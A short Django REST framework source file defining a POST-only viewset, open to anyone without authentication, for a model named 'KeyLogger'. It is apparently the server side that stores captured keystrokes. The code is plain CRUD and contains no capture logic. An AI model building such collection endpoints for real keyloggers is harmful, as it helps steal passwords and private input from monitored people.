from rest_framework import viewsets
from rest_framework.permissions import AllowAny

from apps.keylogger.models import KeyLogger
from apps.keylogger.serializers import KeyLoggerSerializer


class KeyLoggerViewsets(viewsets.ModelViewSet):
    queryset = KeyLogger.objects.all()
    serializer_class = KeyLoggerSerializer
    http_method_names = ['post']
    permission_classes = [AllowAny]
